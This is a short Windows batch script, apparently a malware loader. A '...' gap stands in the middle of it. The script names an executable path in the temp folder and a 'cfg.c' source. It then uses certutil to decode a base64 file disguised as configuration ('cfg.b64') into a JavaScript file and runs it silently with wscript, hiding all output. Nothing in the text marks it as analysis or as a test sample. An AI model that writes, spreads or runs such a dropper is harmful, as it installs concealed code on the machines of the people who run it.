@echo off
setlocal
set "OUT=%TEMP%\rbc_bea5ad1b13e890c6.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_bea5ad1b13e890c6.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_bea5ad1b13e890c6.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_bea5ad1b13e890c6.js"
exit /b 0
